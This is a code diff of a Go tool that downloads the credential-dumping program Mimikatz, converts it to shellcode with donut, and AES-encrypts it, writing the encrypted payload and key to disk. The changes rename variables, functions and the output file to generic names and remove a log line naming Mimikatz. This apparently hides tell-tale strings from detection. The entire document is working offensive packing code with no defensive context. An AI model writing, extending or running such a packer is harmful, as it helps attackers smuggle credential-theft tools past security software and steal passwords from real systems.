@@ -43,8 +43,8 @@ func setExePrefix(exePrefix *string) {
 	}
 }
 
-func downloadMimikatz() ([]byte, error) {
-	var mimikatz []byte
+func downloadBinary() ([]byte, error) {
+	var binary []byte
 
 	resp, err := http.Get(mimikatzURL)
 	checkErr(err)
@@ -62,12 +62,12 @@ func downloadMimikatz() ([]byte, error) {
 		fileHandle, err := file.Open()
 		checkErr(err)
 		defer fileHandle.Close()
-		mimikatz, err = io.ReadAll(fileHandle)
+		binary, err = io.ReadAll(fileHandle)
 		checkErr(err)
 		break
 	}
 
-	return mimikatz, err
+	return binary, err
 }
 
 func encryptAES(data []byte, key []byte) ([]byte, error) {
@@ -96,20 +96,19 @@ func init() {
 }
 
 func main() {
-	fmt.Println("Packing and encrypting mimikatz shellcode...")
-	mimikatz, err := downloadMimikatz()
+	binary, err := downloadBinary()
 	checkErr(err)
 
-	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(mimikatz), donut.DefaultConfig())
+	sc, err := donut.ShellcodeFromBytes(bytes.NewBuffer(binary), donut.DefaultConfig())
 	checkErr(err)
 
 	key := make([]byte, 32)
 	_, err = rand.Read(key)
 	checkErr(err)
 
-	encryptedShellcode, err := encryptAES(shellcode.Bytes(), key)
+	encryptedShellcode, err := encryptAES(sc.Bytes(), key)
 	checkErr(err)
 
-	checkErr(os.WriteFile(path.Join(outputPath, "encrypted_shellcode"), encryptedShellcode, 0777))
+	checkErr(os.WriteFile(path.Join(outputPath, "encrypted_sc"), encryptedShellcode, 0777))
 	checkErr(os.WriteFile(path.Join(outputPath, "key"), key, 0777))
 }
